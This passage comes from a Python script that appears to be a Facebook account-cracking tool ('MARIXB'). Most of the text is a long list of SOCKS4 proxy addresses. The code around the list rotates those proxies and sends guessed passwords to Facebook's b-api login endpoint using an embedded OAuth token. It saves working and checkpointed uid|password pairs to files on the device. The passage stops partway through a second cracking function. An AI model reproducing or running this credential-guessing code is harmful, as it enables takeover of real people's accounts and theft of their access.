                     '224.213.166.123:2313', '139.144.149.248:10006', '200.71.97.1:80', '72.195.34.60:27391',
                     '103.172.24.131:5678', '72.210.221.197:4145', '120.79.31.133:8083', '192.111.137.34:18765',
                     '36.92.9.76:49420', '103.165.22.246:5678', '46.101.163.117:31078', '212.79.108.234:8080',
                     '184.178.172.5:15303', '123.57.1.78:111', '205.240.77.164:4145', '181.229.38.117:5678',
                     '177.36.185.180:5678', '192.158.15.201:50877', '198.89.91.42:5678', '103.161.68.12:1080',
                     '85.113.7.142:5678', '103.4.145.132:1080', '68.183.182.238:57923', '201.234.24.1:4153',
                     '184.181.217.210:4145', '72.221.196.157:35904', '167.86.92.99:30543', '89.58.45.94:43952',
                     '45.234.100.102:1080', '98.162.25.23:4145', '138.68.109.12:29542', '91.121.163.199:63056',
                     '103.12.246.53:4145', '36.89.85.249:5678', '159.203.30.119:16884', '176.123.218.161:18080',
                     '66.42.224.229:41679', '46.98.191.58:5678', '190.4.49.122:35010', '47.92.248.86:5678',
                     '181.113.17.134:43443', '138.68.109.12:63245', '105.208.44.53:5678', '170.84.83.54:5678',
                     '74.119.147.209:4145', '125.70.227.214:10800', '103.105.40.17:4145', '203.205.29.108:5678',
                     '104.248.158.27:25100', '186.189.66.18:4153', '177.93.77.10:4153', '50.235.92.65:32100',
                     '98.188.47.150:4145', '184.178.172.23:4145', '199.102.107.145:4145', '50.255.17.229:32100',
                     '119.235.50.5:4145', '139.255.193.243:7623', '167.71.218.223:26108', '109.75.42.82:3629',
                     '37.57.56.38:5678', '45.190.141.193:1080', '190.210.127.143:65407', '72.37.216.68:4145',
                     '209.13.96.171:39921', '72.195.34.35:27360', '112.221.131.146:5678', '178.249.218.34:5678',
                     '50.236.148.254:31699', '184.178.172.25:15291', '201.236.203.180:4153', '182.23.49.147:4153',
                     '85.172.66.254:1099', '15.168.62.236:33080', '93.190.138.45:41487', '197.157.254.34:4145',
                     '185.170.233.109:47574', '192.111.139.162:4145', '186.159.3.193:45524', '189.195.176.99:5678',
                     '192.252.209.155:14455', '203.154.232.25:4153', '36.255.184.22:5678', '199.229.254.129:4145',
                     '213.208.146.80:5678', '178.48.68.61:4145', '143.137.116.72:1080', '218.21.78.35:4145',
                     '142.54.231.38:4145', '139.224.56.162:9992', '147.139.164.26:7302', '36.88.62.175:7511',
                     '139.224.56.162:999', '49.231.0.178:55860', '104.37.135.145:4145', '159.69.153.169:5566',
                     '199.102.104.70:4145', '68.71.254.6:4145', '117.4.107.199:51796', '98.175.31.195:4145',
                     '123.57.1.78:8888', '181.115.238.186:1080', '213.32.252.134:5678', '14.0.43.193:8449',
                     '88.102.184.156:4153', '138.118.38.2:1080', '102.217.205.117:5678', '182.161.226.15:23658',
                     '190.2.146.108:22690', '103.221.254.59:1088', '185.43.189.182:3629', '90.188.40.61:3629',
                     '202.40.177.186:1088', '39.104.79.145:8088', '199.58.184.97:4145', '45.60.197.203:8148',
                     '200.115.157.211:4145', '131.221.120.196:5678', '121.37.207.154:10000', '213.14.32.70:4153',
                     '45.128.133.209:1080', '58.215.218.170:10800', '139.224.56.162:8082', '178.158.237.68:5678',
                     '69.61.200.104:36181', '143.202.226.13:4145', '51.83.98.190:38593', '115.127.121.198:5678',
                     '104.200.152.30:4145', '159.89.206.6:14601', '218.93.238.185:10800', '61.191.119.134:10800',
                     '36.95.66.243:35010', '184.170.245.148:4145', '115.243.111.42:1088', '91.211.177.245:3629',
                     '109.122.81.1:57553', '98.188.47.132:4145', '139.196.151.191:5001', '174.64.199.79:4145',
                     '103.87.86.146:4153', '184.181.217.206:4145', '217.66.206.156:5678', '72.221.172.203:4145',
                     '118.40.69.218:8899', '186.87.179.54:5678', '1.9.167.36:60489', '183.194.93.138:51080',
                     '187.243.253.238:43015', '47.252.1.180:8999', '92.241.87.14:5678', '192.252.208.70:14282',
                     '46.148.36.47:4153', '136.17.139.223:4915', '190.151.166.15:4153', '138.68.109.12:16386',
                     '186.97.167.26:5678', '72.195.34.42:4145', '199.102.106.94:4145', '47.252.1.180:8499',
                     '5.135.1.146:1981', '82.200.81.5:1080', '98.162.25.7:31653', '178.35.177.242:3629',
                     '154.113.71.102:35010', '188.190.176.114:5678', '107.181.161.81:4145', '138.68.109.12:63428',
                     '207.180.204.70:65432', '173.236.179.119:14694', '177.10.150.3:4145', '5.58.33.187:5678',
                     '47.109.53.253:87', '138.68.109.12:31806', '138.68.109.12:7077', '45.137.64.33:19099',
                     '195.219.98.27:5678', '27.70.161.22:20173', '198.23.143.4:1081', '176.119.141.236:1080',
                     '47.109.53.253:10000', '179.40.75.1:61362', '142.54.236.97:4145', '184.178.172.26:4145',
                     '103.254.167.130:1080', '173.212.245.45:16673', '83.168.84.86:4153', '47.245.56.108:18181',
                     '138.68.105.248:2662', '82.79.129.241:80', '8.219.169.172:19', '45.91.93.166:34575',
                     '102.219.33.179:1080', '197.234.58.102:32767', '98.178.72.21:10919', '8.219.169.172:8080',
                     '112.121.152.139:3128', '103.82.11.209:4153', '8.219.169.172:3790', '103.247.23.82:1080',
                     '8.219.169.172:20', '131.221.182.14:4153', '200.46.30.210:4153', '72.195.114.184:4145',
                     '103.210.29.201:31433', '47.92.242.45:3128', '178.150.188.118:1099', '142.54.239.1:4145',
                     '47.250.134.231:10080', '109.236.86.203:37879', '180.191.22.50:4153', '46.40.60.108:52088',
                     '41.139.250.223:5678', '47.92.242.45:443', '47.250.135.8:10080', '139.196.151.191:50001',
                     '98.170.57.231:4145', '198.8.94.170:4145', '176.118.52.129:3629', '187.252.154.90:4153',
                     '157.245.1.59:15674', '114.108.177.104:60984', '197.159.130.134:5678', '167.71.241.136:33299',
                     '103.93.177.228:5678', '162.19.137.78:34297', '37.26.136.224:4153', '184.178.172.28:15294',
                     '109.236.86.66:48471', '191.7.213.71:31576', '159.138.252.45:8181', '176.114.244.102:33722',
                     '49.0.250.196:9002', '138.255.240.66:40736', '171.226.94.233:20167', '159.89.228.253:38172',
                     '65.21.149.198:8080', '173.212.237.43:33657', '81.7.86.154:4145', '47.92.242.45:9999',
                     '184.181.217.194:4145', '45.60.197.203:4520', '173.212.245.45:14364', '159.65.225.229:49772',
                     '159.138.252.45:5566', '47.243.58.145:5555', '46.101.218.52:58704', '125.141.139.197:5566',
                     '80.191.40.41:5678', '190.119.167.11:5678', '68.71.247.130:4145', '176.117.175.40:5678',
                     '189.91.85.133:31337', '49.0.250.196:502', '73.185.216.244:80', '184.185.2.12:4145',
                     '105.214.2.80:5678', '49.0.250.196:999', '161.35.25.221:3295', '122.9.131.161:8011',
                     '199.102.105.242:4145', '122.9.131.161:3333', '163.53.186.250:5678', '191.37.68.142:32627',
                     '117.186.40.30:1080', '159.138.252.45:6789', '142.54.228.193:4145', '46.23.141.142:5678',
                     '103.224.54.225:31433', '188.164.222.147:1080', '24.234.142.122:31008', '8.213.129.15:999',
                     '173.249.33.122:54853', '170.79.182.82:11337', '47.92.239.69:3128', '70.80.75.236:5678',
                     '183.164.243.149:8089', '174.77.111.197:4145', '199.58.185.9:4145', '103.233.152.180:1080',
                     '80.78.234.31:1080', '202.21.115.94:44574', '103.127.204.109:25327', '184.178.172.17:4145',
                     '91.93.64.227:4145', '47.253.214.60:2080', '202.40.188.92:55103', '158.140.190.211:5678',
                     '198.199.101.121:2327', '167.99.182.125:14475', '98.162.25.16:4145', '80.80.164.164:10801',
                     '103.144.18.202:1080', '138.68.109.12:18395', '116.63.130.30:58208', '144.76.99.207:16003',
                     '108.175.24.1:13135', '51.75.126.150:37198', '192.111.135.17:18302', '27.115.33.94:4153',
                     '134.209.154.177:49425', '47.253.214.60:8989', '51.38.71.114:58083', '45.132.75.19:16863',
                     '181.13.198.90:4153', '159.89.29.73:8080', '177.93.76.6:4145', '192.111.139.165:4145',
                     '39.104.57.170:9002', '72.210.208.101:4145', '8.213.129.15:8989', '181.129.70.82:44357',
                     '192.111.134.10:4145', '192.141.236.10:5678', '116.118.98.5:5678', '103.102.26.1:7469',
                     '72.206.181.97:64943', '47.252.27.174:3128', '76.81.6.107:31008', '195.114.9.184:34445',
                     '121.200.60.122:4153', '138.68.109.12:22412', '118.137.56.108:1080', '184.178.172.11:4145',
                     '82.103.118.42:1099', '184.181.217.213:4145', '202.166.206.59:5678', '103.94.1.98:1080',
                     '173.236.172.4:49631', '8.213.129.15:8089', '173.212.219.197:26877', '212.83.143.60:20733',
                     '138.68.109.12:20535', '186.103.143.213:4153', '192.111.130.2:4145', '89.19.175.117:4145',
                     '103.160.17.38:5678', '5.135.1.146:21287', '202.46.91.218:12391', '210.86.173.42:4153',
                     '192.252.208.67:14287', '121.33.161.113:4145', '185.95.199.103:1099', '103.70.159.149:5678',
                     '222.165.234.242:41541', '98.170.57.249:4145', '103.111.53.82:58033', '117.92.125.24:8089',
                     '177.188.138.11:3128', '72.206.181.103:4145', '188.166.234.144:14605', '72.195.34.41:4145',
                     '117.74.65.29:1111', '117.74.65.29:16072', '197.232.47.122:5678', '98.162.25.29:31679',
                     '206.42.33.45:1080', '197.232.43.224:1080', '103.17.90.6:5678', '138.68.109.12:15866',
                     '117.74.65.29:5566', '121.139.218.165:43295', '117.74.65.29:7788', '181.209.106.187:1080',
                     '103.127.23.10:5678', '190.120.250.31:4145', '124.107.36.198:5678', '72.221.232.152:4145',
                     '138.117.141.27:8888', '117.74.65.29:10005', '131.161.68.41:35944', '168.228.36.22:35010',
                     '213.145.137.102:37447', '186.115.219.59:4153', '117.74.65.29:4063', '64.90.53.25:54049',
                     '63.151.9.74:64312', '206.189.85.33:10198', '139.255.97.156:14888', '95.188.82.147:3629',
                     '170.244.0.179:4145', '142.44.165.103:27982', '98.162.96.52:4145', '138.68.109.12:62662',
                     '170.246.84.89:35010', '192.111.129.145:16894', '190.145.37.5:65409', '185.139.56.133:4145',
                     '14.161.14.106:5678', '72.195.34.58:4145', '98.181.137.83:4145', '103.127.204.117:27217',
                     '82.147.123.185:10808', '117.74.65.29:10000', '80.92.227.185:5678', '147.139.164.26:8080',
                     '187.19.150.221:80', '103.114.96.93:1080', '192.111.139.163:19404', '190.211.161.212:32410',
                     '154.94.0.133:5678', '72.217.216.239:4145', '23.88.121.205:16586', '175.139.179.65:41527',
                     '122.248.38.4:4153', '134.119.189.9:14339', '197.248.28.17:10801', '65.20.222.175:35010',
                     '192.252.220.89:4145', '72.210.252.134:46164', '46.105.105.223:19963', '192.111.137.35:4145',
                     '159.203.63.113:50720', '45.128.135.253:1080', '200.27.110.30:57702', '142.54.229.249:4145',
                     '27.70.165.109:20173', '74.119.144.60:4145', '103.120.38.238:5678', '184.181.217.220:4145',
                     '103.37.82.134:39873', '31.172.133.253:4153', '154.79.248.156:5678', '8.209.243.173:8888',
                     '190.89.89.157:4153', '89.28.32.203:57391', '51.222.108.216:25018', '190.182.88.226:52339',
                     '101.51.121.141:4153', '54.39.46.139:44918', '45.91.93.166:17657', '103.127.63.57:5678',
                     '46.98.192.233:5678', '41.223.65.158:4153', '202.40.177.94:5678', '206.42.38.85:1080',
                     '162.212.174.239:80', '138.197.66.68:42588', '45.60.197.203:8907', '95.31.5.29:51528',
                     '36.67.63.239:38071', '138.68.109.12:47831', '131.196.180.1:4153', '195.69.135.19:5678',
                     '68.1.210.163:4145', '95.140.117.10:1080', '109.226.36.78:1080', '217.23.13.32:35479',
                     '179.253.8.244:7777', '14.241.241.185:4145', '162.253.68.97:4145', '45.60.197.203:1187',
                     '184.178.172.3:4145', '5.178.217.227:31019', '103.168.123.92:5678', '39.104.89.111:999',
                     '115.85.84.163:5678', '187.9.76.154:4153', '39.104.89.111:8084', '41.207.251.206:8899',
                     '93.190.143.82:41515', '36.67.14.5:5678', '95.104.160.140:7788', '181.174.85.78:5678',
                     '102.39.113.232:5678', '192.111.130.5:17002', '186.194.234.18:4153', '202.179.184.34:5430',
                     '170.84.83.172:5678', '130.193.123.34:5678', '209.126.127.97:61122', '112.78.138.163:5678',
                     '192.252.211.197:14921', '72.195.114.169:4145', '103.231.176.58:5678', '91.150.77.57:56921',
                     '72.210.221.223:4145', '8.219.167.110:8009', '72.221.171.130:4145', '164.52.42.6:4145',
                     '108.175.23.241:13135', '46.160.90.81:5678', '198.11.175.192:8989', '70.166.167.55:57745',
                     '42.49.148.167:3333', '192.111.138.29:4145', '203.23.49.150:5678', '8.219.167.110:5678',
                     '179.107.52.101:4153', '8.219.167.110:9000', '72.221.164.34:60671', '174.77.111.198:49547',
                     '72.221.171.135:4145', '5.189.129.186:56940', '181.48.70.30:4153', '45.128.133.169:1080',
                     '188.167.178.90:4145', '113.176.195.145:4153', '117.74.65.29:9595', '154.72.78.146:5678',
                     '109.111.242.142:1080', '54.82.101.127:8088', '98.162.25.4:31654', '116.233.95.105:4145',
                     '46.105.105.223:8028', '190.2.136.45:47521', '117.74.65.29:143', '43.248.27.11:54730',
                     '98.162.96.53:10663', '117.74.65.29:4118', '185.164.57.111:7614', '117.74.65.29:2087',
                     '184.178.172.14:4145', '155.254.9.2:36510', '182.16.171.42:51459', '117.74.65.29:5005',
                     '109.166.207.162:3629', '188.64.113.104:1080', '188.75.255.119:35010', '222.165.223.140:41541',
                     '200.116.198.140:37092', '192.252.216.81:4145', '213.6.77.198:5678', '170.246.85.108:37163',
                     '183.88.247.52:4153', '187.19.127.246:8011', '200.41.60.33:4153', '141.94.254.138:49207',
                     '190.12.95.170:37209', '181.115.75.102:5678', '72.206.181.123:4145', '191.36.191.53:5678',
                     '36.64.16.154:35010', '184.105.133.1:48324', '117.74.65.29:646', '104.236.114.255:1611',
                     '81.16.9.222:3629', '188.92.110.174:1080', '46.8.106.140:5500', '92.42.8.20:4145',
                     '200.105.192.6:5678', '95.31.42.199:3629', '186.97.144.98:5678', '94.180.217.100:4145',
                     '27.147.155.70:52596', '165.227.228.102:80', '108.41.35.10:22419', '181.129.74.58:30431',
                     '187.67.26.179:4145', '117.74.65.29:3002', '51.79.248.208:54578', '187.32.20.249:5678',
                     '200.159.146.184:4153', '117.74.65.215:9300', '103.247.22.52:12', '184.181.217.201:4145',
                     '117.74.65.215:6789', '170.80.91.11:4145', '46.188.2.42:5678', '117.74.65.29:9093',
                     '187.103.0.26:5678', '117.74.65.215:33427', '185.89.65.165:33744', '192.252.214.20:15864',
                     '213.74.223.69:4153', '142.54.232.6:4145', '132.148.75.242:47171', '117.74.65.215:10091',
                     '109.238.208.130:4153', '184.170.248.5:4145', '72.210.252.137:4145', '116.118.98.10:5678',
                     '117.74.65.215:3000', '213.186.202.149:5678', '221.4.161.201:51080', '196.29.231.1:4145',
                     '170.246.196.42:4153', '41.169.78.142:57775', '3.39.244.149:33080', '68.71.249.153:48606',
                     '202.40.186.66:1088', '123.56.129.203:8089', '51.255.80.151:42304', '142.229.215.114:3128',
                     '208.102.51.6:58208', '182.253.93.4:4145', '62.112.11.204:12692', '202.124.224.19:80',
                     '46.227.37.21:1088', '134.209.154.177:11639', '159.192.121.240:4145', '138.219.201.242:5678',
                     '174.75.211.222:4145', '140.210.196.193:20000', '117.74.65.215:1604', '79.143.225.152:31270',
                     '103.106.119.146:12391', '177.131.29.209:4153', '109.224.12.170:52015', '98.162.96.41:4145',
                     '117.74.65.215:11443', '81.174.11.159:43516', '200.146.229.129:8291', '177.185.221.57:21776',
                     '14.160.23.139:4145', '94.247.241.70:51006', '117.74.65.29:8110', '213.165.185.211:4153',
                     '138.68.116.249:8017', '107.181.168.145:4145', '177.66.59.130:4153', '98.181.137.80:4145',
                     '213.222.34.200:4145', '72.221.232.155:4145', '204.3.205.243:80', '45.157.126.165:6121',
                     '103.28.23.229:4145', '180.250.190.150:1080', '103.127.204.112:12132', '213.226.11.149:59086',
                     '92.51.78.66:4153', '186.94.29.52:8080', '181.129.62.2:47377', '24.249.199.4:4145',
                     '203.76.112.68:5678', '94.181.33.149:40840', '37.131.165.19:59341', '185.18.72.249:4153',
                     '47.243.124.21:81', '172.106.13.203:56950', '181.143.61.123:4153', '67.201.33.10:25283',
                     '27.118.21.13:5678', '213.74.223.76:4153', '103.139.246.166:5678', '62.122.201.246:50129',
                     '89.38.96.50:48439', '115.127.87.62:1088', '115.127.75.154:1088', '103.93.100.78:32000',
                     '103.48.183.113:4145', '103.138.22.165:32000', '190.119.167.154:5678', '104.200.135.46:4145',
                     '103.91.95.2:32767', '119.46.2.250:4145', '103.134.113.247:32767', '114.103.88.116:8089',
                     '110.44.171.10:57775', '95.170.202.197:58744', '46.172.75.51:5678', '41.58.169.214:5678',
                     '190.186.216.196:5678', '103.235.199.100:25566', '58.143.65.69:22569', '125.126.213.4:38801',
                     '197.234.58.102:57775', '45.117.228.81:4145', '186.145.192.251:5678', '109.94.178.238:3629',
                     '103.250.153.202:41889', '46.105.105.223:45443', '138.122.74.55:57775', '200.60.71.12:46934',
                     '103.167.172.104:57775', '183.111.165.166:14', '159.65.9.135:10277', '146.196.121.29:57775',
                     '47.109.46.223:8090', '117.74.65.29:8012', '142.54.235.9:4145', '107.152.98.5:4145',
                     '103.79.165.164:57775', '193.106.192.50:36387', '154.0.155.205:8080', '202.154.18.115:1080',
                     '177.234.244.170:32213', '72.49.49.11:31034', '45.174.240.94:999', '103.168.233.91:25566',
                     '103.149.104.161:4153', '170.254.148.110:8080', '159.138.255.141:9981', '79.122.244.99:3128',
                     '49.70.89.82:9999', '95.158.174.111:1080', '103.18.232.47:80', '202.57.37.197:35846',
                     '43.229.73.239:41862', '41.190.152.130:4673', '79.173.75.182:3629', '41.57.34.112:1080',
                     '110.78.149.70:4145', '31.131.135.247:4153', '5.133.96.148:4153', '103.152.104.228:1080',
                     '80.250.18.225:25566', '190.114.143.226:8080', '117.198.221.34:4153', '213.145.134.174:3629',
                     '177.38.245.106:55713', '201.184.239.75:5678', '103.230.62.146:12391', '117.74.125.19:1313',
                     '194.85.135.243:4145', '80.254.185.73:1080', '93.104.63.65:80', '165.0.15.182:5678',
                     '91.193.125.123:3629', '117.74.120.61:1313', '177.107.217.112:4145', '24.172.34.114:60133',
                     '41.190.232.36:36926', '117.220.162.33:5621', '95.81.94.254:3128', '197.211.24.206:5678',
                     '103.176.96.116:5678', '91.121.163.199:40148', '94.154.21.65:1080', '102.89.12.203:7599',
                     '119.18.146.139:4153', '209.94.84.65:1080', '117.74.120.121:1133', '47.100.90.127:10443',
                     '103.207.170.131:5678', '180.210.222.233:1080'}
            proxy = random.choice(proxy)
            proxs= {'http': 'socks4://'+proxy}
            dataX = {'email':uid,
                    'password':pw,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
            headersX = {'accept-encoding': 'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'content-type': 'application/x-www-form-urlencoded',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-friendly-name': 'authenticate',
                    'x-fb-http-engine': 'Liger',
                    'user-agent': useragent}
            responce = requests.post('https://b-api.facebook.com/method/auth.login',data=dataX,headers=headersX,allow_redirects=False).text
            responce_json = json.loads(responce)
            if 'session_key' in responce_json:
                uidX = str(responce_json['uid'])
                if uidX not in oks:
                    print(f'\r{green}[MARIXB-OK] {uidX} | {pw} {white}')
                    open('/sdcard/MARIXB-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'\r{rad}[MARIXB-CP] {uid}     | {pw} {white}')
                    open('/sdcard/MARIXB-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:pass
#_______[ B-API CRACK - FILE ]_____>>
def bapif(uidY,pwx,total):
    global oks,cps
    global ualist
    global cracked
    uid = uidY.split("|")[0]
    name = uidY.split("|")[1]
    fist = name.split(" ")[0]
    try:
        last = name.split(" ")[1]
    except IndexError:
        last = "Khan"
    try:
        sys.stdout.write(f'\r\r[{green}MARI-XB{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            proxy = ['139.171.162.10:5520', '45.228.45.147:35010', '27.42.168.46:61308', '184.178.172.18:15280', '36.91.203.231:5678', '49.156.38.126:5678', '58.34.34.186:10800', '192.111.135.18:18301', '224.213.166.123:2313', '139.144.149.248:10006', '200.71.97.1:80', '72.195.34.60:27391', '103.172.24.131:5678', '72.210.221.197:4145', '120.79.31.133:8083', '192.111.137.34:18765', '36.92.9.76:49420', '103.165.22.246:5678', '46.101.163.117:31078', '212.79.108.234:8080', '184.178.172.5:15303', '123.57.1.78:111', '205.240.77.164:4145', '181.229.38.117:5678', '177.36.185.180:5678', '192.158.15.201:50877', '198.89.91.42:5678', '103.161.68.12:1080', '85.113.7.142:5678', '103.4.145.132:1080', '68.183.182.238:57923', '201.234.24.1:4153', '184.181.217.210:4145', '72.221.196.157:35904', '167.86.92.99:30543', '89.58.45.94:43952', '45.234.100.102:1080', '98.162.25.23:4145', '138.68.109.12:29542', '91.121.163.199:63056', '103.12.246.53:4145', '36.89.85.249:5678', '159.203.30.119:16884', '176.123.218.161:18080', '66.42.224.229:41679', '46.98.191.58:5678', '190.4.49.122:35010', '47.92.248.86:5678', '181.113.17.134:43443', '138.68.109.12:63245', '105.208.44.53:5678', '170.84.83.54:5678', '74.119.147.209:4145', '125.70.227.214:10800', '103.105.40.17:4145', '203.205.29.108:5678', '104.248.158.27:25100', '186.189.66.18:4153', '177.93.77.10:4153', '50.235.92.65:32100', '98.188.47.150:4145', '184.178.172.23:4145', '199.102.107.145:4145', '50.255.17.229:32100', '119.235.50.5:4145', '139.255.193.243:7623', '167.71.218.223:26108', '109.75.42.82:3629', '37.57.56.38:5678', '45.190.141.193:1080', '190.210.127.143:65407', '72.37.216.68:4145', '209.13.96.171:39921', '72.195.34.35:27360', '112.221.131.146:5678', '178.249.218.34:5678', '50.236.148.254:31699', '184.178.172.25:15291', '201.236.203.180:4153', '182.23.49.147:4153', '85.172.66.254:1099', '15.168.62.236:33080', '93.190.138.45:41487', '197.157.254.34:4145', '185.170.233.109:47574', '192.111.139.162:4145', '186.159.3.193:45524', '189.195.176.99:5678', '192.252.209.155:14455', '203.154.232.25:4153', '36.255.184.22:5678', '199.229.254.129:4145', '213.208.146.80:5678', '178.48.68.61:4145', '143.137.116.72:1080', '218.21.78.35:4145', '142.54.231.38:4145', '139.224.56.162:9992', '147.139.164.26:7302', '36.88.62.175:7511', '139.224.56.162:999', '49.231.0.178:55860', '104.37.135.145:4145', '159.69.153.169:5566', '199.102.104.70:4145', '68.71.254.6:4145', '117.4.107.199:51796', '98.175.31.195:4145', '123.57.1.78:8888', '181.115.238.186:1080', '213.32.252.134:5678', '14.0.43.193:8449', '88.102.184.156:4153', '138.118.38.2:1080', '102.217.205.117:5678', '182.161.226.15:23658', '190.2.146.108:22690', '103.221.254.59:1088', '185.43.189.182:3629', '90.188.40.61:3629', '202.40.177.186:1088', '39.104.79.145:8088', '199.58.184.97:4145', '45.60.197.203:8148', '200.115.157.211:4145', '131.221.120.196:5678', '121.37.207.154:10000', '213.14.32.70:4153', '45.128.133.209:1080', '58.215.218.170:10800', '139.224.56.162:8082', '178.158.237.68:5678', '69.61.200.104:36181', '143.202.226.13:4145', '51.83.98.190:38593', '115.127.121.198:5678', '104.200.152.30:4145', '159.89.206.6:14601', '218.93.238.185:10800', '61.191.119.134:10800', '36.95.66.243:35010', '184.170.245.148:4145', '115.243.111.42:1088', '91.211.177.245:3629', '109.122.81.1:57553', '98.188.47.132:4145', '139.196.151.191:5001', '174.64.199.79:4145', '103.87.86.146:4153', '184.181.217.206:4145', '217.66.206.156:5678', '72.221.172.203:4145', '118.40.69.218:8899', '186.87.179.54:5678', '1.9.167.36:60489', '183.194.93.138:51080', '187.243.253.238:43015', '47.252.1.180:8999', '92.241.87.14:5678', '192.252.208.70:14282', '46.148.36.47:4153', '136.17.139.223:4915', '190.151.166.15:4153', '138.68.109.12:16386', '186.97.167.26:5678', '72.195.34.42:4145', '199.102.106.94:4145', '47.252.1.180:8499', '5.135.1.146:1981', '82.200.81.5:1080', '98.162.25.7:31653', '178.35.177.242:3629', '154.113.71.102:35010', '188.190.176.114:5678', '107.181.161.81:4145', '138.68.109.12:63428', '207.180.204.70:65432', '173.236.179.119:14694', '177.10.150.3:4145', '5.58.33.187:5678', '47.109.53.253:87', '138.68.109.12:31806', '138.68.109.12:7077', '45.137.64.33:19099', '195.219.98.27:5678', '27.70.161.22:20173', '198.23.143.4:1081', '176.119.141.236:1080', '47.109.53.253:10000', '179.40.75.1:61362', '142.54.236.97:4145', '184.178.172.26:4145', '103.254.167.130:1080', '173.212.245.45:16673', '83.168.84.86:4153', '47.245.56.108:18181', '138.68.105.248:2662', '82.79.129.241:80', '8.219.169.172:19', '45.91.93.166:34575', '102.219.33.179:1080', '197.234.58.102:32767', '98.178.72.21:10919', '8.219.169.172:8080', '112.121.152.139:3128', '103.82.11.209:4153', '8.219.169.172:3790', '103.247.23.82:1080', '8.219.169.172:20', '131.221.182.14:4153', '200.46.30.210:4153', '72.195.114.184:4145', '103.210.29.201:31433', '47.92.242.45:3128', '178.150.188.118:1099', '142.54.239.1:4145', '47.250.134.231:10080', '109.236.86.203:37879', '180.191.22.50:4153', '46.40.60.108:52088', '41.139.250.223:5678', '47.92.242.45:443', '47.250.135.8:10080', '139.196.151.191:50001', '98.170.57.231:4145', '198.8.94.170:4145', '176.118.52.129:3629', '187.252.154.90:4153', '157.245.1.59:15674', '114.108.177.104:60984', '197.159.130.134:5678', '167.71.241.136:33299', '103.93.177.228:5678', '162.19.137.78:34297', '37.26.136.224:4153', '184.178.172.28:15294', '109.236.86.66:48471', '191.7.213.71:31576', '159.138.252.45:8181', '176.114.244.102:33722', '49.0.250.196:9002', '138.255.240.66:40736', '171.226.94.233:20167', '159.89.228.253:38172', '65.21.149.198:8080', '173.212.237.43:33657', '81.7.86.154:4145', '47.92.242.45:9999', '184.181.217.194:4145', '45.60.197.203:4520', '173.212.245.45:14364', '159.65.225.229:49772', '159.138.252.45:5566', '47.243.58.145:5555', '46.101.218.52:58704', '125.141.139.197:5566', '80.191.40.41:5678', '190.119.167.11:5678', '68.71.247.130:4145', '176.117.175.40:5678', '189.91.85.133:31337', '49.0.250.196:502', '73.185.216.244:80', '184.185.2.12:4145', '105.214.2.80:5678', '49.0.250.196:999', '161.35.25.221:3295', '122.9.131.161:8011', '199.102.105.242:4145', '122.9.131.161:3333', '163.53.186.250:5678', '191.37.68.142:32627', '117.186.40.30:1080', '159.138.252.45:6789', '142.54.228.193:4145', '46.23.141.142:5678', '103.224.54.225:31433', '188.164.222.147:1080', '24.234.142.122:31008', '8.213.129.15:999', '173.249.33.122:54853', '170.79.182.82:11337', '47.92.239.69:3128', '70.80.75.236:5678', '183.164.243.149:8089', '174.77.111.197:4145', '199.58.185.9:4145', '103.233.152.180:1080', '80.78.234.31:1080', '202.21.115.94:44574', '103.127.204.109:25327', '184.178.172.17:4145', '91.93.64.227:4145', '47.253.214.60:2080', '202.40.188.92:55103', '158.140.190.211:5678', '198.199.101.121:2327', '167.99.182.125:14475', '98.162.25.16:4145', '80.80.164.164:10801', '103.144.18.202:1080', '138.68.109.12:18395', '116.63.130.30:58208', '144.76.99.207:16003', '108.175.24.1:13135', '51.75.126.150:37198', '192.111.135.17:18302', '27.115.33.94:4153', '134.209.154.177:49425', '47.253.214.60:8989', '51.38.71.114:58083', '45.132.75.19:16863', '181.13.198.90:4153', '159.89.29.73:8080', '177.93.76.6:4145', '192.111.139.165:4145', '39.104.57.170:9002', '72.210.208.101:4145', '8.213.129.15:8989', '181.129.70.82:44357', '192.111.134.10:4145', '192.141.236.10:5678', '116.118.98.5:5678', '103.102.26.1:7469', '72.206.181.97:64943', '47.252.27.174:3128', '76.81.6.107:31008', '195.114.9.184:34445', '121.200.60.122:4153', '138.68.109.12:22412', '118.137.56.108:1080', '184.178.172.11:4145', '82.103.118.42:1099', '184.181.217.213:4145', '202.166.206.59:5678', '103.94.1.98:1080', '173.236.172.4:49631', '8.213.129.15:8089', '173.212.219.197:26877', '212.83.143.60:20733', '138.68.109.12:20535', '186.103.143.213:4153', '192.111.130.2:4145', '89.19.175.117:4145', '103.160.17.38:5678', '5.135.1.146:21287', '202.46.91.218:12391', '210.86.173.42:4153', '192.252.208.67:14287', '121.33.161.113:4145', '185.95.199.103:1099', '103.70.159.149:5678', '222.165.234.242:41541', '98.170.57.249:4145', '103.111.53.82:58033', '117.92.125.24:8089', '177.188.138.11:3128', '72.206.181.103:4145', '188.166.234.144:14605', '72.195.34.41:4145', '117.74.65.29:1111', '117.74.65.29:16072', '197.232.47.122:5678', '98.162.25.29:31679', '206.42.33.45:1080', '197.232.43.224:1080', '103.17.90.6:5678', '138.68.109.12:15866', '117.74.65.29:5566', '121.139.218.165:43295', '117.74.65.29:7788', '181.209.106.187:1080', '103.127.23.10:5678', '190.120.250.31:4145', '124.107.36.198:5678', '72.221.232.152:4145', '138.117.141.27:8888', '117.74.65.29:10005', '131.161.68.41:35944', '168.228.36.22:35010', '213.145.137.102:37447', '186.115.219.59:4153', '117.74.65.29:4063', '64.90.53.25:54049', '63.151.9.74:64312', '206.189.85.33:10198', '139.255.97.156:14888', '95.188.82.147:3629', '170.244.0.179:4145', '142.44.165.103:27982', '98.162.96.52:4145', '138.68.109.12:62662', '170.246.84.89:35010', '192.111.129.145:16894', '190.145.37.5:65409', '185.139.56.133:4145', '14.161.14.106:5678', '72.195.34.58:4145', '98.181.137.83:4145', '103.127.204.117:27217', '82.147.123.185:10808', 